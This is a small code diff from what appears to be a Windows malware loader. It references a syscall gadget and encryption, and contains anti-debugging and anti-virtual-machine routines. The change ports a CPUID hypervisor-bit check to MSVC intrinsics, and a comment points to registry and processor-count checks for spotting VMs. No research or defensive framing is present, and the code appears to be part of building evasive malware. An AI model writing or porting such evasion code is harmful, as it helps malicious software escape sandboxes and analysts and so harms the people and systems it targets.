@@ -8,7 +8,7 @@
 #include "syscalls.h"
 #include "crypto.h"
 #include "anti_triadic.h"
-#include <cpuid.h>
+#include <intrin.h>
 
 // Shared globals from loader
 extern PVOID g_SyscallGadget;
@@ -127,9 +127,9 @@ static BOOL AntiDebug() {
 
 static BOOL AntiVM() {
     // 1. CPUID hypervisor bit (leaf 1, ECX bit 31)
-    int a, b, c, d;
-    __cpuid(1, a, b, c, d);
-    if (c & (1 << 31)) return TRUE;
+    int cpuInfo[4] = {0};
+    __cpuid(cpuInfo, 1);
+    if (cpuInfo[2] & (1 << 31)) return TRUE;
 
     // 2. Check for known VM registry artifacts (lightweight)
     // Check number of processors – VMs often have 1-2
